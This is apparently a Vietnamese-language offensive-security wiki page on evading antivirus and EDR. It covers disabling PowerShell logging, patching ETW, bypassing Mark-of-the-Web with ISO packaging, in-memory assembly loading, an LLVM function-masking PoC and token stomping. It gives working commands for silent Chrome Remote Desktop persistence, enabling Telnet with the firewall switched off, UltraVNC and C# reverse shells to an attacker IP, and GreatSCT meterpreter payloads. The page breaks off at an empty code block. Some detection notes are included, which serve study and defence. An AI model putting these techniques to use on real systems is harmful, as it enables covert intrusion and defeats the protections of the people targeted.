Ghi nhật ký PowerShell là tính năng cho phép ghi lại tất cả lệnh PowerShell được thực thi trên hệ thống. Tính năng này có thể hữu ích cho mục đích kiểm tra và khắc phục sự cố, nhưng cũng có thể là **vấn đề đối với những kẻ tấn công muốn né tránh bị phát hiện**.

Để bypass ghi nhật ký PowerShell, bạn có thể dùng các kỹ thuật sau:

- **Vô hiệu hóa PowerShell Transcription và Module Logging**: Bạn có thể dùng công cụ như [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) cho mục đích này.
- **Dùng Powershell phiên bản 2**: Nếu dùng PowerShell phiên bản 2, AMSI sẽ không được tải, vì vậy bạn có thể chạy script mà không bị AMSI quét. Thực hiện như sau: `powershell.exe -version 2`
- **Dùng phiên PowerShell unmanaged**: Dùng [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) để host PowerShell mà không khởi chạy `powershell.exe` (cách tiếp cận được `powerpick` của Cobalt Strike sử dụng). Cách này né tránh các biện pháp kiểm soát gắn cụ thể với tiến trình `powershell.exe`, nhưng tự nó không vô hiệu hóa AMSI, Script Block Logging hay mọi biện pháp bảo vệ PowerShell khác; phạm vi bảo vệ phụ thuộc vào runtime và cách triển khai host.


## Làm rối mã

> [!TIP]
> Một số kỹ thuật làm rối mã dựa vào việc mã hóa dữ liệu, điều này làm tăng entropy của binary và khiến AV, EDR dễ phát hiện hơn. Hãy cẩn thận; có thể chỉ mã hóa những phần cụ thể trong code nhạy cảm hoặc cần được che giấu.

### Deobfuscating các binary .NET được bảo vệ bằng ConfuserEx

Khi phân tích malware sử dụng ConfuserEx 2 (hoặc các fork thương mại), bạn thường sẽ gặp nhiều lớp bảo vệ chặn decompiler và sandbox. Quy trình dưới đây giúp **khôi phục IL gần như nguyên bản** một cách đáng tin cậy, sau đó có thể decompile thành C# bằng các công cụ như dnSpy hoặc ILSpy.<sup>[[10]](#references)</sup>

1.  Gỡ bỏ anti-tampering – ConfuserEx mã hóa mọi *method body* và giải mã chúng bên trong static constructor của *module* (`<Module>.cctor`). Nó cũng vá PE checksum nên mọi sửa đổi đều sẽ khiến binary gặp sự cố. Dùng **AntiTamperKiller** để tìm các bảng metadata đã mã hóa, khôi phục các khóa XOR và ghi lại một assembly sạch:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output chứa 6 tham số anti-tamper (`key0-key3`, `nameHash`, `internKey`), có thể hữu ích khi xây dựng unpacker của riêng bạn.

2.  Khôi phục symbol / control-flow – đưa file *clean* vào **de4dot-cex** (một fork của de4dot có hỗ trợ ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – chọn profile ConfuserEx 2
     • de4dot sẽ gỡ control-flow flattening, khôi phục namespace, class và tên biến ban đầu, đồng thời giải mã các chuỗi hằng.

3.  Loại bỏ proxy call – ConfuserEx thay thế các lời gọi phương thức trực tiếp bằng các wrapper nhẹ (còn gọi là *proxy call*) để khiến việc decompile khó hơn.  Loại bỏ chúng bằng **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Sau bước này, bạn sẽ thấy các API .NET thông thường như `Convert.FromBase64String` hoặc `AES.Create()` thay vì các hàm wrapper khó hiểu (`Class8.smethod_10`, …).

4.  Dọn dẹp thủ công – chạy binary thu được trong dnSpy, tìm các blob Base64 lớn hoặc việc sử dụng `RijndaelManaged`/`TripleDESCryptoServiceProvider` để xác định payload *thực*. Malware thường lưu payload dưới dạng mảng byte được mã hóa TLV, khởi tạo bên trong `<Module>.byte_0`.

Chuỗi bước trên khôi phục luồng thực thi **mà không cần chạy mẫu độc hại** – hữu ích khi làm việc trên máy trạm ngoại tuyến.

> 🛈  ConfuserEx tạo một custom attribute có tên `ConfusedByAttribute`, có thể dùng làm IOC để tự động phân loại sơ bộ các mẫu.

#### Lệnh một dòng
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Mục tiêu của dự án này là cung cấp một nhánh fork mã nguồn mở của bộ biên dịch [LLVM](http://www.llvm.org/), có khả năng tăng cường bảo mật phần mềm thông qua [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) và chống giả mạo.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator minh họa cách sử dụng ngôn ngữ `C++11/14` để tạo code obfuscated tại thời điểm biên dịch mà không cần công cụ bên ngoài và không sửa đổi compiler.
- [**obfy**](https://github.com/fritzone/obfy): Thêm một lớp các thao tác obfuscated được tạo bởi framework C++ template metaprogramming, khiến việc crack ứng dụng trở nên khó khăn hơn một chút.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz là một x64 binary obfuscator có thể obfuscate nhiều loại PE file, bao gồm: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame là một engine metamorphic code đơn giản dành cho các executable tùy ý.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator là một framework code obfuscation chi tiết cho các ngôn ngữ được LLVM hỗ trợ, sử dụng ROP (return-oriented programming). ROPfuscator obfuscate chương trình ở cấp độ assembly bằng cách chuyển các instruction thông thường thành các ROP chain, phá vỡ hình dung tự nhiên của chúng ta về luồng điều khiển thông thường.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt là một .NET PE Crypter được viết bằng Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor có thể chuyển EXE/DLL hiện có thành shellcode rồi nạp chúng

### Tự che giấu từng function với sự hỗ trợ của LLVM compiler

Thay vì chỉ che giấu toàn bộ implant khi nó ở trạng thái ngủ, một LLVM X86 backend đã sửa đổi có thể giữ các function được chọn ở dạng XOR-masked bất cứ khi nào chúng không hoạt động. PoC Function Peekaboo chọn các tên đã được demangle có chứa `REG_`, chèn các stub entry/exit position-independent quanh machine code cuối cùng, và xuất một masking handler dùng chung trong `.text`; các signature ở cấp source và Windows x64 calling convention vẫn không đổi.<sup>[[38]](#references)[[39]](#references)</sup>

#### Biến đổi control flow trong backend

Việc này cần được thực hiện sau instruction selection và optimization vì quá trình biến đổi phải bao quát **mọi return được xuất ra** và biết chính xác bố cục x86. Một `MachineFunctionPass` chạy trước bước xuất tìm `MachineInstr::isReturn()` cuối cùng, xóa nó để đường đi cuối cùng rơi xuống epilogue được nối thêm, và thay các return trước đó bằng `JMP_1 handler`. Giữ nguyên mọi thao tác tháo stack/frame do compiler tạo ra trước mỗi return; chỉ chuyển hướng chính instruction return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` và `X86AsmPrinter::emitFunctionBodyEnd()` xuất các stub cho từng function, trong khi `emitEndOfAsmFile()` xuất handler. Các symbol dùng chung giữa những giai đoạn xuất cho phép nhánh trong prologue trỏ tới epilogue được xuất sau đó; với `je` dạng near được xuất thủ công, hãy ghi `0F 84`, theo sau là MC expression bốn byte `target - address_after_je`. Thay vào đó, có thể xuất các lệnh gọi và nhảy tới handler dưới dạng đối tượng `MCInst` (`CALL64pcrel32` và `JMP_1`). Một pass phải trả về `false` cho function không được chọn nếu nó không thay đổi gì; PoC trả về `true` không chính xác trong trường hợp đó.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata và khởi tạo trước CRT

PoC đặt một khóa XOR và các record 16 byte chứa function pointer được loader relocate cùng độ dài runtime trong `.funcmeta`. Dù trường C là `uint32_t`, handler truy cập một QWORD tại offset `+8` của record, đọc cả độ dài lẫn phần đệm, rồi tiến qua các record theo bước `0x10`. Tên section PE chỉ dài tối đa tám byte, vì vậy tra cứu runtime thấy `.funcmet`. Một patcher bên ngoài thêm section thực thi `.stub`, lưu RVA entry point cũ trong stub và chuyển hướng `AddressOfEntryPoint`; PIC stub lấy image base từ `gs:[0x60]` → `[PEB+0x10]`, duyệt các import PE32+ để phân giải `VirtualProtect` đã được import từ trước, rồi chạy trước CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Quá trình khởi tạo đặt một sentinel trong `gs:[0xE8]` và gọi mọi function trong metadata. Prologue luôn ở dạng có thể đọc được sẽ ghi điểm bắt đầu function vào `gs:[0xF0]`, phát hiện sentinel và bỏ qua body vẫn đang ở dạng clear. Sau đó epilogue dùng `call handler`; khi handler lưu 13 register (`0x68` byte), địa chỉ return tại `[rsp+0x68]` chính là điểm kết thúc của function đã biến đổi, vì vậy có thể ghi `end - start` vào record metadata của function đó. Stub xóa sentinel và nhảy tới `ImageBase + original_entry_point_RVA` sau khi mọi body đã được mask.<sup>[[38]](#references)[[39]](#references)</sup>

Trong một lần gọi thông thường, prologue gọi cùng symmetric handler để giải mã body. Đường đi cuối cùng rơi xuống epilogue được nối thêm, trong khi mọi return trước đó nhảy thẳng tới handler dùng chung. Epilogue thông thường cũng dùng `jmp handler` thay vì `call`, vì vậy sau khi mask lại, `ret` của handler lấy địa chỉ return ban đầu của caller và giữ nguyên giá trị trả về của function trong `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking và dấu hiệu phân tích

Handler tìm record hiện tại, bỏ qua prologue cố định có thể đọc được (`0x46` byte trong bản build này), đổi phần còn lại thành `PAGE_EXECUTE_READWRITE`, XOR từng byte với byte thấp của khóa, rồi đặt nó thành `PAGE_EXECUTE_READ`. Do đó, cùng một vòng lặp sẽ giải mã khi vào và mã hóa khi mỗi lần thoát bình thường.<sup>[[38]](#references)[[39]](#references)</sup>

Các dấu hiệu có độ tin cậy cao của thiết kế này bao gồm:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point nằm bên trong `.stub` có quyền thực thi và section `.funcmet` chứa một khóa cùng các con trỏ `.text` đã relocate;
- phân tích PEB, import table và section table trước CRT, sau đó gọi qua từng con trỏ metadata;
- các PIC prologue `call`/`pop` giống hệt nhau và nhiều vị trí return được chuyển hướng tới một handler;
- ghi vào `gs:[0xE8]`, `gs:[0xF0]` và `gs:[0xF8]`, tiếp theo là các lần chuyển quyền liên tiếp bằng `VirtualProtect` và các thao tác XOR từng byte ghi vào những trang thực thi được hỗ trợ bởi image.

Đây là cách né memory scanner, không phải biện pháp bảo vệ bằng mật mã: file đã patch vẫn chứa body gốc ở dạng clear, và debugger có thể đặt breakpoint tại `VirtualProtect` hoặc vòng lặp XOR để dump function đang hoạt động. XOR một byte, metadata có thể đọc được và ranh giới cố định `0x46` cũng khiến việc khôi phục offline trở nên đơn giản.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Các slot TEB của PoC là thread-local, nhưng các code page đã sửa đổi có phạm vi toàn process. Vì vậy, việc vào function đồng thời hoặc đệ quy có thể khiến các instruction bị đổi trạng thái trong khi một lần gọi khác đang thực thi; exception và các lối thoát không cục bộ cũng có thể bỏ qua bước mask lại. Một implementation vững chắc phải đồng bộ hóa các lần chuyển trạng thái, khôi phục đúng quyền bảo vệ được trả về qua `lpflOldProtect`, tránh hard-code độ dài stub, kiểm tra cả đường đi `call` lẫn `jmp` để bảo đảm căn chỉnh stack x64, và gọi `FlushInstructionCache` sau khi ghi lại các byte thực thi. Microsoft nêu rõ caller chịu trách nhiệm về tính nhất quán của instruction cache khi mã thực thi bị sửa đổi.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Có thể bạn đã thấy màn hình này khi tải một số executable từ internet xuống và chạy chúng.

Microsoft Defender SmartScreen là một cơ chế bảo mật nhằm bảo vệ người dùng cuối khỏi việc chạy các ứng dụng có khả năng độc hại.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen chủ yếu hoạt động dựa trên danh tiếng, nghĩa là các ứng dụng ít được tải xuống sẽ kích hoạt SmartScreen, từ đó cảnh báo và ngăn người dùng cuối chạy file (mặc dù vẫn có thể chạy file bằng cách nhấp vào More Info -> Run anyway).

**MoTW** (Mark of The Web) là một [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) có tên Zone.Identifier, được tự động tạo khi tải file từ internet xuống, cùng với URL nơi tải file đó.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kiểm tra Zone.Identifier ADS của một file được tải xuống từ internet.</p></figcaption></figure>

> [!TIP]
> Cần lưu ý rằng các executable được ký bằng chứng chỉ ký **đáng tin cậy** sẽ **không kích hoạt SmartScreen**.

Một cách rất hiệu quả để ngăn payload của bạn bị gắn Mark of The Web là đóng gói chúng bên trong một dạng container như ISO. Điều này xảy ra vì Mark-of-the-Web (MOTW) **không thể** được áp dụng cho các volume **không phải NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) là một công cụ đóng gói payload vào các container đầu ra để né Mark-of-the-Web.

Ví dụ cách sử dụng:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Đây là bản demo bypass SmartScreen bằng cách đóng gói payload bên trong các tệp ISO bằng [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) là một cơ chế ghi log mạnh mẽ trong Windows, cho phép ứng dụng và thành phần hệ thống **ghi log sự kiện**. Tuy nhiên, các sản phẩm bảo mật cũng có thể dùng cơ chế này để giám sát và phát hiện hoạt động độc hại.

Tương tự như cách vô hiệu hóa (bypass) AMSI, ta cũng có thể khiến hàm **`EtwEventWrite`** của tiến trình user space trả về ngay lập tức mà không ghi log sự kiện nào. Việc này được thực hiện bằng cách patch hàm trong bộ nhớ để nó trả về ngay, qua đó vô hiệu hóa việc ghi log ETW cho tiến trình đó.

Bạn có thể tìm hiểu thêm tại **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) và [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Việc tải các tệp nhị phân C# vào bộ nhớ đã được biết đến từ lâu và vẫn là một cách rất hiệu quả để chạy các công cụ post-exploitation mà không bị AV phát hiện.

Vì payload được tải trực tiếp vào bộ nhớ mà không ghi xuống ổ đĩa, ta chỉ cần lo việc patch AMSI cho toàn bộ tiến trình.

Hầu hết các framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, v.v.) đã hỗ trợ thực thi trực tiếp C# assembly trong bộ nhớ, nhưng có nhiều cách khác nhau để thực hiện:

- **Fork\&Run**

Cách này bao gồm **khởi chạy một tiến trình hy sinh mới**, inject mã độc post-exploitation vào tiến trình mới đó, thực thi mã độc rồi kết thúc tiến trình sau khi hoàn tất. Cách này có cả ưu điểm lẫn nhược điểm. Ưu điểm của phương pháp fork and run là việc thực thi diễn ra **bên ngoài** tiến trình Beacon implant của chúng ta. Điều này có nghĩa là nếu có sự cố xảy ra trong quá trình post-exploitation hoặc bị phát hiện, **khả năng implant của chúng ta tồn tại** sẽ **cao hơn nhiều**. Nhược điểm là **khả năng bị phát hiện** bởi **Behavioural Detections** cũng **cao hơn**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Cách này là inject mã độc post-exploitation **vào chính tiến trình của nó**. Nhờ vậy, bạn có thể tránh tạo tiến trình mới và để AV quét tiến trình đó, nhưng nhược điểm là nếu có sự cố khi thực thi payload, **khả năng mất beacon** sẽ **cao hơn nhiều** vì tiến trình có thể bị crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Nếu muốn tìm hiểu thêm về việc tải C# Assembly, hãy xem bài viết này [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) và BOF InlineExecute-Assembly của họ ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Bạn cũng có thể tải C# Assembly **từ PowerShell**; hãy xem [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) và [video của S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Đóng gói lại công cụ .NET bằng WebAssembly NativeAOT (WasmForge)

Các kỹ thuật `execute-assembly` thông thường vẫn giữ lại MSIL dễ nhận diện và cuối cùng khởi tạo CLR. **WasmForge** thay đổi nền tảng thực thi: nó chuyển một dự án C# sang đích NativeAOT-LLVM WASI thử nghiệm, biên dịch trước thành WebAssembly rồi nhúng module đó vào một Windows PE host dựa trên Wazero. Tiến trình tạo ra không cần CLR, JIT hoặc host `dotnet` trên máy mục tiêu, nên các quy tắc chỉ dựa trên tên managed assembly, việc tải CLR, AMSI hoặc .NET ETW sẽ không còn khả năng quan sát trực tiếp. Đây là kỹ thuật né tránh/đóng gói, không phải bypass ranh giới đặc quyền — guest vẫn giữ nguyên quyền và hành vi OS có thể quan sát được của công cụ gốc.<sup>[[44]](#references)[[45]](#references)</sup>

### Build một dự án C#

Quy trình build được khuyến nghị là dùng môi trường Docker của dự án vì môi trường này có .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker và các dependency ký số. Tệp `.csproj` được tự động phát hiện; quy trình build một lần sẽ thực hiện chuyển đổi, vá tương thích, biên dịch WASM, tạo PE và ký số.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Để khắc phục sự cố hoặc rà soát code được tạo, hãy chia quy trình thành `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` và bước cuối `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Image build cũng dùng wrapper `wasm-component-ld` để tránh mã hóa component WASI Preview 2 và tạo module thuần mà runtime nhúng yêu cầu.<sup>[[44]](#references)[[45]](#references)</sup>

### Kết nối C# wasm32 với Win32 x64

Đây không phải là biên dịch lại trong suốt. NativeAOT-WASI thiếu hoặc thay đổi các tính năng BCL hướng đến Windows, còn guest wasm32 thường cấp phát các ô con trỏ bốn byte trong khi API x64 có thể trả về con trỏ tám byte. WasmForge xử lý cả hai vấn đề bằng các lớp được tạo sau:<sup>[[44]](#references)</sup>

1. Một source patcher sửa các khác biệt ngữ nghĩa riêng của AOT và chuyển hướng những lời gọi registry, pipes, WMI, identity, directory-service, file-version, LSA và các lời gọi tương tự không được hỗ trợ sang các helper `Wf*`.
2. Một P/Invoke scanner tạo các ánh xạ NativeAOT `DirectPInvoke` để các lời gọi `[DllImport]` liên kết với các symbol C bridge đã liên kết, thay vì tải động DLL được khai báo bên trong guest.
3. Các con trỏ gắn với host dùng `ulong` trong C# và `uint64_t` trong C. Một dispatcher tổng quát chuyển tiếp lời gọi đến handler Win32 của host; `out8_mask` đánh dấu các ô đầu ra tám byte thực sự cần giữ lại phần trên. Các đầu ra theo dạng wasm32 không được đánh dấu dùng cơ chế bảo vệ snapshot/restore để tránh việc ghi dữ liệu x64 làm hỏng bốn byte liền kề.
4. Các host bridge chuyên biệt xử lý những thao tác không phù hợp với cơ chế dispatch syscall tổng quát, chẳng hạn như truy cập bộ nhớ đệm ticket LSA, các thao tác Kerberos/BCrypt có kết quả dạng cấu trúc, lưu lượng TCP KDC và truy vấn LDAP.

Ví dụ, một wrapper cho `version.dll!VerQueryValueW` truyền bốn địa chỉ host và đặt các bit 2 và 3 (`0xC`) vì con trỏ giá trị và độ dài là các ô đầu ra tám byte. Bản thân wrapper vẫn có tính tổng quát và chuyển tên DLL, tên export, các đối số cùng mask đến `wf_call_v2`; host thực hiện chuyển đổi con trỏ và gọi API native.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Hạn chế và các hướng phát hiện

Code sử dụng nhiều reflection, tải assembly động, callback native tùy ý và các cấu trúc x64 phức tạp được trả về bộ nhớ WASM vẫn có thể cần bản vá riêng cho từng công cụ hoặc hoàn toàn không chạy được. Socket WASI Preview 2 tổng quát cũng có thể gọi đến các stub no-op, vì vậy những công cụ được hỗ trợ sử dụng host shim dành riêng cho từng giao thức. Hãy xác thực từng lệnh bằng bản build native thay vì mặc định rằng các tính năng tương đương nhau.<sup>[[44]](#references)[[45]](#references)</sup>

Kỹ thuật này chuyển hướng telemetry chứ không khiến payload trở nên vô hình. Phát hiện có thể chuyển sang tìm PE chứa hoặc tạo ra module WASM, hành vi của runtime kiểu Wazero, việc cấp phát và sao chép bộ nhớ host/guest bất thường, điều phối Win32 trực tiếp tổng quát, dấu hiệu bất thường về signing và tài nguyên PE, cùng các lệnh gọi API và lưu lượng mạng phát sinh. Vì vậy, không nên xem việc thiếu sự kiện CLR-load, AMSI hoặc .NET ETW là bằng chứng cho thấy tiến trình vô hại.<sup>[[44]](#references)</sup>

## Sử dụng các ngôn ngữ lập trình khác

Như được đề xuất trong [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), có thể thực thi code độc hại bằng các ngôn ngữ khác bằng cách cho máy bị xâm nhập truy cập **môi trường interpreter được cài đặt trên SMB share do Attacker kiểm soát**.

Bằng cách cho phép truy cập các tệp nhị phân Interpreter và môi trường trên SMB share, bạn có thể **thực thi code tùy ý bằng các ngôn ngữ này trong bộ nhớ** của máy bị xâm nhập.

Repo cho biết: Defender vẫn quét các script, nhưng sử dụng Go, Java, PHP, v.v. giúp chúng ta **linh hoạt hơn trong việc bypass chữ ký tĩnh**. Thử nghiệm với các script reverse shell ngẫu nhiên, chưa obfuscate bằng những ngôn ngữ này đã cho kết quả thành công.

## Re-hosting WebAssembly để né tránh phân tích tĩnh

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping thao túng access token của một sản phẩm bảo mật như EDR hoặc AV. Giảm quyền của token có thể khiến tiến trình tiếp tục chạy nhưng không thể thực hiện các hành động kiểm tra hoặc khắc phục cần đặc quyền.

Để ngăn việc này, Windows có thể **chặn các tiến trình bên ngoài** lấy handle tới token của các tiến trình bảo mật.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Sử dụng phần mềm đáng tin cậy

### Chrome Remote Desktop

Như được mô tả trong [**bài blog này**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), bạn có thể dễ dàng triển khai Chrome Remote Desktop trên PC của nạn nhân, sau đó dùng nó để chiếm quyền điều khiển và duy trì persistence:<sup>[[35]](#references)</sup>
1. Tải xuống từ https://remotedesktop.google.com/, nhấp vào "Set up via SSH", sau đó nhấp vào tệp MSI dành cho Windows để tải xuống.
2. Chạy trình cài đặt ở chế độ im lặng trên máy nạn nhân (cần quyền admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Quay lại trang Chrome Remote Desktop và nhấp vào Next. Trình hướng dẫn sẽ yêu cầu bạn cấp quyền; nhấp vào nút Authorize để tiếp tục.
4. Chạy lệnh được cung cấp sau khi điều chỉnh các giá trị cần thiết: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (tham số `--pin` đặt PIN mà không cần dùng GUI).
 

## Né tránh nâng cao

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Né tránh là một chủ đề rất phức tạp; đôi khi bạn phải tính đến nhiều nguồn telemetry khác nhau trong cùng một hệ thống, vì vậy gần như không thể hoàn toàn tránh bị phát hiện trong các môi trường trưởng thành.

Mỗi môi trường bạn nhắm đến đều có những điểm mạnh và điểm yếu riêng.

Tôi rất khuyến khích bạn xem bài nói chuyện này của [@ATTL4S](https://twitter.com/DaniLJ94) để tìm hiểu các kỹ thuật né tránh nâng cao hơn.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Đây cũng là một bài nói chuyện tuyệt vời khác của [@mariuszbit](https://twitter.com/mariuszbit) về Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Các kỹ thuật cũ**

### **Kiểm tra những phần nào bị Defender phát hiện là độc hại**

Bạn có thể dùng [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), công cụ này sẽ **loại bỏ từng phần của binary** cho đến khi **xác định được phần nào bị Defender** phát hiện là độc hại, rồi tách phần đó ra cho bạn.\
Một công cụ khác làm **việc tương tự là** [**avred**](https://github.com/dobin/avred), cung cấp dịch vụ trên web tại [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Cho đến Windows10, mọi phiên bản Windows đều có **Telnet server** mà bạn có thể cài đặt (với quyền administrator) bằng cách chạy:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Thiết lập để nó **khởi động** khi hệ thống khởi động và **chạy** nó ngay bây giờ:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Đổi cổng telnet** (stealth) và tắt firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Tải xuống tại: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bạn cần tải các bản bin, không phải bản setup)

**TRÊN MÁY CHỦ**: Chạy _**winvnc.exe**_ và cấu hình server:

- Bật tùy chọn _Disable TrayIcon_
- Đặt mật khẩu trong _VNC Password_
- Đặt mật khẩu trong _View-Only Password_

Sau đó, chuyển file nhị phân _**winvnc.exe**_ và file _**UltraVNC.ini**_ vừa tạo vào **máy nạn nhân**

#### **Reverse connection**

**Kẻ tấn công** cần **chạy trên** **máy chủ** của mình file nhị phân `vncviewer.exe -listen 5900` để **sẵn sàng** nhận **VNC connection** ngược. Sau đó, trên **máy nạn nhân**: Khởi động daemon winvnc bằng lệnh `winvnc.exe -run` và chạy `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**CẢNH BÁO:** Để duy trì tính ẩn mình, bạn không được làm một số việc sau:

- Đừng khởi động `winvnc` nếu nó đã chạy, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/1SROTTl.png). Kiểm tra xem nó có đang chạy không bằng lệnh `tasklist | findstr winvnc`
- Đừng khởi động `winvnc` khi không có `UltraVNC.ini` trong cùng thư mục, nếu không [cửa sổ cấu hình](https://i.imgur.com/rfMQWcf.png) sẽ mở ra
- Đừng chạy `winvnc -h` để xem trợ giúp, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Tải xuống tại: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Bên trong GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Giờ hãy **khởi động lister** bằng `msfconsole -r file.rc` và **thực thi** **xml payload** bằng:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender hiện tại sẽ kết thúc tiến trình rất nhanh.**

### Biên dịch reverse shell của riêng chúng ta

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell C# đầu tiên

Biên dịch bằng:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Sử dụng nó với:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
